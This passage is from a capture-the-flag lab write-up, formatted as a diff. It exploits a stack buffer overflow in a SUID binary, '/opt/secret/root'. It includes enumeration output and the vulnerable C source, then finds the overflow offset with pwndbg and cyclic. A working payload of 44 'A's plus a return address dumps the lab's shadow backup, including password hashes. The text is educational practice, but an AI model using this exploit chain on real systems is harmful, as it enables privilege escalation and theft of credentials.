+ii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
+ii  g++-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C++ compiler
+ii  gcc                                 4:5.3.1-1ubuntu1                           amd64        GNU C compiler
+ii  gcc-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C compiler
+ii  gcc-5-multilib                      5.4.0-6ubuntu1~16.04.12                    amd64        GNU C compiler (multilib support)
+ii  gcc-multilib                        4:5.3.1-1ubuntu1                           amd64        GNU C compiler (multilib files)
+ii  libllvm6.0:amd64                    1:6.0-1ubuntu2~16.04.1                     amd64        Modular compiler and toolchain technologies, runtime library
+ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                           amd64        library interface to the XKB compiler - shared library
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1556 Jan 16  2020 /etc/passwd
+-rw-r--r-- 1 root root 825 Jan 15  2020 /etc/group
+-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
+-rw-r----- 1 root shadow 1072 Jan 15  2020 /etc/shadow
+
+[-] SUID files:
+-r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+
+[-] SGID files:
+-rwxr-sr-x 1 root ssh 358624 Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root mlocate 39520 Nov 17  2014 /usr/bin/mlocate
+-rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage
+-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
+-rwxr-sr-x 1 root tty 27368 May 16  2018 /usr/bin/wall
+-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
+
+[+] Files with POSIX capabilities set:
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 338 Nov 17  2014 /etc/updatedb.conf
+-rw-r--r-- 1 root root 10368 Oct  2  2015 /etc/sensors3.conf
+-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 3028 Feb 26  2019 /etc/adduser.conf
+-rw-r--r-- 1 root root 6488 Jan 15  2020 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
+-rw-r--r-- 1 root root 2084 Sep  5  2015 /etc/sysctl.conf
+-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
+-rw-r--r-- 1 root root 350 Jan 15  2020 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
+-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
+-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
+-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
+-rw-r--r-- 1 root root 280 Jun 19  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
+-rw-r--r-- 1 root root 144 Jan 15  2020 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
+-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
+-rw-r--r-- 1 root root 14867 Apr 11  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
+
+[-] Current user's history files:
+lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 /home/pingu/.bash_history -> /dev/null
+-rw------- 1 pingu pingu 1852 Jan 20  2020 /home/pingu/.gdb_history
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/papa/.bash_history
+/home/pingu/.bash_history
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw-r--r-- 1 root root 3020 Jan 15  2020 /etc/apt/sources.bak
+-rw-r----- 1 papa papa 895 Jan 15  2020 /var/backups/shadow.bak
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Feb 26  2019 .
+drwxr-xr-x 13 root root 4096 Jan 15  2020 ..
+
+### SCAN COMPLETE ####################################
+
+[-] SUID files:
+-r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
+```
+What is the interesting path of the interesting suid file
+*/opt/secret/root*
+### pwndbg
+Luckily for us I was able to snag a copy of the source code from my dad's flash drive
+```text
+#include "unistd.h" #include "stdio.h" #include "stdlib.h" void shell(){ setuid(1000); setgid(1000); system("cat /var/backups/shadow.bak"); } void get_input(){ char buffer[32]; scanf("%s",buffer); } int main(){ get_input(); }
+  
+
+Este código es un programa escrito en lenguaje C que incluye tres funciones: "shell", "get_input" y "main".
+
+La función "shell" utiliza las funciones "setuid" y "setgid" para establecer el ID de usuario y el ID de grupo del proceso en 1000. Luego utiliza la función "system" para ejecutar el comando "cat /var/backups/shadow.bak", que muestra el contenido del archivo "shadow.bak" en el directorio "/var/backups".
+
+La función "get_input" declara una variable de tipo char llamada "buffer" con un tamaño de 32 bytes y luego utiliza la función "scanf" para leer una cadena de caracteres desde la entrada estándar y almacenarla en "buffer".
+
+La función "main" es la función principal del programa y llama a la función "get_input" para leer la entrada del usuario.
+
+En resumen, este programa lee una cadena de caracteres de la entrada estándar y luego muestra el contenido del archivo "shadow.bak" en el directorio "/var/backups". Es importante tener en cuenta que este programa también establece el ID de usuario y el ID de grupo del proceso en 1000, lo que significa que el programa se ejecutará con los permisos del usuario y el grupo con IDs 1000. Si este programa se ejecuta como root, podría tener acceso a archivos y directorios restringidos y puede representar un riesgo de seguridad.
+```
+The SUID file seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.
+Run `gdb /opt/secret/root` and you should see a screen similar to this
+![](https://imgur.com/yXO2cLo.jpg)
+This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type `r < <(cyclic 50)`, that command runs the program and provides 50 characters worth of "cyclic" input.
+Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.
+Once you run that command you should see something similar to this screen
+![](https://imgur.com/RDSPKbe.jpg)
+Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time.
+Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP.
+Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.
+Running `cyclic -l 0x6161616c` outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.
+That's all we needed for pre-explotation!
+Answer the questions below
+Read the above :)
+```text
+pingu@ubuntu:/opt/secret$ file root
+root: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af41c72a4c8f1a4d720315cdafa47536e92657b2, not stripped
+
+In byte architectures, **little-endian** is also known as LSB, referring to the Least Significant Byte coming first.
+
+I'll do my way :)
+
+pingu@ubuntu:/opt/secret$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.8.19.103 - - [27/Dec/2022 07:22:39] "GET /root HTTP/1.1" 200 -
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ wget http://10.10.208.3:8000/root
+--2022-12-27 10:22:40--  http://10.10.208.3:8000/root
+Connecting to 10.10.208.3:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7516 (7.3K) [application/octet-stream]
+Saving to: ‘root’
+
+root                        100%[=========================================>]   7.34K  --.-KB/s    in 0s      
+
+2022-12-27 10:22:40 (182 MB/s) - ‘root’ saved [7516/7516]
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ ls
+root
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ gdb root
+GNU gdb (Debian 12.1-4) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from root...
+(No debugging symbols found in root)
+(gdb) set exec-wrapper env -u LINES -u COLUMNS
+(gdb) run
+Starting program: /home/kali/bufferoverflow/penguin/root 
+env: ‘/home/kali/bufferoverflow/penguin/root’: Permission denied
+During startup program exited with code 126.
+(gdb) run
+Starting program: /home/kali/bufferoverflow/penguin/root 
+env: ‘/home/kali/bufferoverflow/penguin/root’: Permission denied
+During startup program exited with code 126.
+(gdb) exit
+
+uhmm
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ chmod +x root
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ python2
+Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
+[GCC 12.1.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 'A'*50
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ ./root
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+zsh: segmentation fault  ./root
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ gdb root
+GNU gdb (Debian 12.1-4) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from root...
+(No debugging symbols found in root)
+(gdb) set exec-wrapper env -u LINES -u COLUMNS
+(gdb) run
+Starting program: /home/kali/bufferoverflow/penguin/root 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+(gdb) disassemble special
+No symbol table is loaded.  Use the "file" command.
+
+(gdb) disassemble shell
+Dump of assembler code for function shell:
+   0x080484cb <+0>:     push   %ebp
+   0x080484cc <+1>:     mov    %esp,%ebp
+   0x080484ce <+3>:     sub    $0x8,%esp
+   0x080484d1 <+6>:     sub    $0xc,%esp
+   0x080484d4 <+9>:     push   $0x3e8
+   0x080484d9 <+14>:    call   0x80483a0 <setuid@plt>
+   0x080484de <+19>:    add    $0x10,%esp
+   0x080484e1 <+22>:    sub    $0xc,%esp
+   0x080484e4 <+25>:    push   $0x3e8
+   0x080484e9 <+30>:    call   0x8048370 <setgid@plt>
+   0x080484ee <+35>:    add    $0x10,%esp
+   0x080484f1 <+38>:    sub    $0xc,%esp
+   0x080484f4 <+41>:    push   $0x80485d0
+   0x080484f9 <+46>:    call   0x8048380 <system@plt>
+   0x080484fe <+51>:    add    $0x10,%esp
+   0x08048501 <+54>:    nop
+   0x08048502 <+55>:    leave  
+   0x08048503 <+56>:    ret    
+End of assembler dump.
+
+ We're dealing with little endian, and so the memory location we actually need to write, written in little endian, is:
+
+ 0x080484cb  --> \xcb\x84\x04\x08
+
+and
+
+0x41414141 in ?? () and with 50 we did a segmentation fault , so will be 50-44 = 6
+
+>>> 'A'*44
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ ./root
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (44)
+zsh: segmentation fault  ./root
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ ./root
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (43)
+
+and finally will be
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ python2 -c "print 'A'* 44 + '\xcb\x84\x04\x08' " | ./root
+cat: /var/backups/shadow.bak: No such file or directory
+zsh: done                python2 -c "print 'A'* 44 + '\xcb\x84\x04\x08' " | 
+zsh: segmentation fault  ./root
+
+actually works but /var/backups/shadow.bak I don't have so let's do it in pingu (ssh)
+
+pingu@ubuntu:/opt/secret$ python2 -c "print 'A'* 44 + '\xcb\x84\x04\x08' " | ./root
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+Segmentation fault
+
+It works :)
+
+let's do through 
+
+pingu@ubuntu:/opt/secret$ gdb /opt/secret/root
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
+pwndbg> r < <(cyclic 50)
+Starting program: /opt/secret/root < <(cyclic 50)
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/pingu/.pwntools-cache-2.7/update to 'never'.
+[!] An issue occurred while checking PyPI
+[*] You have the latest version of Pwntools (4.0.0)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────
